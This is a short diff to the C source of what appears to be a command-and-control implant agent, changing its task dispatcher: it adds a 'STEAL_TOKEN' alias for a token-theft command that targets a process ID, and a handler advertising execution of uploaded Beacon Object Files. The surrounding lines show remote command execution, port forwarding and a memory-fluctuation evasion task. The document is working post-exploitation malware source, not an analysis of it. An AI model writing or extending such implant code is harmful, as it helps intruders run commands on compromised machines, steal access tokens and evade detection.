@@ -2058,7 +2058,7 @@ void dispatch_task(AgentTask *task) {
         char *out = fork_run(cmd[0] ? cmd : NULL, task->payload, task->payload_len);
         agent_send_result(task->id, out, ""); free(out);
     }
-    else if (strcmp(type_upper, "TOKEN_STEAL") == 0) {
+    else if (strcmp(type_upper, "TOKEN_STEAL") == 0 || strcmp(type_upper, "STEAL_TOKEN") == 0) {
         int pid = json_get_int(args, "pid", 0);
         if (!pid) { agent_send_result(task->id, "", "TOKEN_STEAL requires {\"pid\":N}"); return; }
         char *out = token_steal(pid);
@@ -4122,6 +4122,11 @@ void dispatch_task(AgentTask *task) {
         if (tok) lport = atoi(tok);
         if (!lport) { agent_send_result(task->id,"","usage: [tcp|udp] <lport>"); return; }
         agent_send_result(task->id, portfwd_del(proto, lport), "");
+    }
+    else if (strcmp(type_upper, "BOF_LIST") == 0) {
+        agent_send_result(task->id,
+            "BOF execution supported. Upload a .coff/.o file with 'upload', then run with 'bof <filename>'.\n"
+            "Supported arg types: z (string), i (int32), s (int16), b (bool/byte), Z (wstring), B (binary blob).", "");
     }
     else if (strcmp(type_upper, "MEM_FLUCTUATE") == 0) {
         char argbuf[64]; strncpy(argbuf, args, sizeof(argbuf)-1);
